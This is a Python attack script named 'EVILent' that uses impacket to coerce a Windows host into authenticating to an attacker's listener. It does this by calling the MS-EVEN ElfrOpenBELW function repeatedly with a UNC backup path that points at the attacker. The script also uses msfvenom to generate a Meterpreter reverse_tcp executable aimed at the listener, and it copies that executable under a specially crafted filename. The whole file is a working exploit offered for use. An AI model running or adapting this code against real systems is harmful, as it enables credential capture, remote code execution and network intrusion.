import argparse, sys, re
from impacket.dcerpc.v5 import even
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dtypes import NULL, RPC_UNICODE_STRING
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
import subprocess, os


def transform_filename(backup_file_name: str) -> str:
    # Разделяем имя файла и расширение
    path, name = backup_file_name.rsplit('\\', 1)
    
    # Добавляем еще одно расширение
    new_name = f"{name}em"

    # Добавляем точные байты, которые превращаются в 䵌䵅P
    garbage_bytes = b'\xe4\xb5\x8c\xe4\xb5\x85\x50'  # Соответствуют 䵌䵅P

    # Преобразуем в ANSI-строку
    final_name = new_name.encode('utf-8', errors='ignore') + garbage_bytes
    
    
    # Декодируем обратно, чтобы получить финальную строку (если нужно в str)
    return final_name.decode('utf-8', errors='ignore')

    

    




def create_payload(listen_ip, backup_file_name):

    path, name = backup_file_name.rsplit('\\', 1)
    new_filename = transform_filename(backup_file_name)
    print('[+] Gererate specific filenames ' + name + ' ' + new_filename)
    cmd_msf = [f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={listen_ip} LPORT=4444 -f exe -o {name}']
    msf_process = subprocess.Popen(
        cmd_msf, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True
    )
    output = msf_process.stdout.read()
    print(output.decode('utf-8'))
    cmd_copy = 'cp ' + os.getcwd() + '/' + name + ' ' + os.getcwd() + '/' + new_filename
    scmd_copy_process = subprocess.Popen(
        cmd_copy, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True
    )
    #print(cmd_copy)

class Evilent:
    def __init__(self, domain, username, password, remoteName, listen_ip, backup_file_name, hashes):
        self.atk_listener = listen_ip
        self.username = username
        self.domain   = domain
        self.password = password
        self.machine  = remoteName
        self.hashes   = "" if hashes == None else hashes
        self.backup_file_name = backup_file_name
        self.stringBinding = r'ncacn_np:%s[\PIPE\eventlog]' % self.machine


    def connect(self):
        print(f"[*] Connecting to {self.stringBinding}...")
        try:
            rpctransport = transport.DCERPCTransportFactory(self.stringBinding)
            if len(self.hashes) > 0:
                lmhash, nthash = self.hashes.split(':')
            else:
                lmhash = ''
                nthash = ''
            if hasattr(rpctransport, 'set_credentials'):
                rpctransport.set_credentials(self.username, self.password, self.domain, lmhash, nthash)
            dce = rpctransport.get_dce_rpc()
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(even.MSRPC_UUID_EVEN)
            print("[*] Bind successful")
        except Exception as e:
            print(f"[!] {str(e)}")
            sys.exit(1)

        return dce, rpctransport

    def run(self):
        dce, rpctransport = self.connect()

        #backup = '\\??\\UNC\\%s\\%s' % (self.atk_listener, self.backup_file_name)
        backup = '\\??\\UNC\\%s\\%s' % (self.atk_listener, self.backup_file_name)
        print(f"[*] Forcing {self.machine} to auth to {backup}")

        request = even.ElfrOpenBELW()
        request['UNCServerName'] = NULL # '%s\x00' % self.atk_listener
        request['BackupFileName'] = backup
        request['MajorVersion'] = 1
        request['MinorVersion'] = 1
        for i in range(0,20):
            #print(request.dump())
            print(i)
            try:
                resp = dce.request(request)
            except Exception as e:
                resp = e.get_packet()
            #resp.dump()




def parse_target(target):
    target_regex = re.compile(r"(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)")

    domain, username, password, remote_name = target_regex.match(target).groups('')

    # In case the password contains '@'
    if '@' in remote_name:
        password = password + '@' + remote_name.rpartition('@')[0]
        remote_name = remote_name.rpartition('@')[2]

    return domain, username, password, remote_name


if __name__ == "__main__":
    print("EVILent attack by @Tcross, original MS-EVEN impacket-version by @eversinc33, original C poc by @evilashz")
    parser = argparse.ArgumentParser(add_help = True, description = "Cause a machine to authenticate to you via MS_EVEN ElfrOpenBELW")
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('listenip', action="store", metavar = "Listener IP", help="IP of the listener that the target will authenticate to")
    parser.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", default=None, help='NTLM hashes, format is LMHASH:NTHASH')
    parser.add_argument('-backupfile', action="store", metavar = "NAME", default='scratch\\xx')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
 
    options = parser.parse_args()
    domain, username, password, remoteName = parse_target(options.target)
    backup_file_name = options.backupfile
    hashes = options.hashes

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None:
        from getpass import getpass
        password = getpass("Password:")

    create_payload(options.listenip, backup_file_name)    
    Evilent(domain, username, password, remoteName, options.listenip, backup_file_name, hashes).run()
